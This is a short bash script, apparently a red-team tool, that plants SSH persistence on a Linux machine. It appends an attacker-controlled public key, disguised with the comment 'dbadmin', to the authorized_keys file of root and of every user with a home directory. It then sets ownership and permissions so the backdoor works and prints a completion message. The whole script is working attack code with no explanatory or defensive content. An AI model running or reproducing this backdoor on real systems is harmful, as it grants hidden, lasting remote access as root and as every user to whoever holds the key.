#!/bin/bash

ATTACKER_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOVJ+3hLCoQopEKeiE6JDiFsFW78aYXITdG6JsbG2/gi dbadmin"

# Add to root
mkdir -p /root/.ssh
echo "$ATTACKER_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Add to all users with home directories
for user_home in /home/*/; do
    username=$(basename "$user_home")
    mkdir -p "$user_home/.ssh"
    echo "$ATTACKER_KEY" >> "$user_home/.ssh/authorized_keys"
    chown -R "$username:$username" "$user_home/.ssh"
    chmod 700 "$user_home/.ssh"
    chmod 600 "$user_home/.ssh/authorized_keys"
done

echo "[RED TEAM] SSH persistence complete"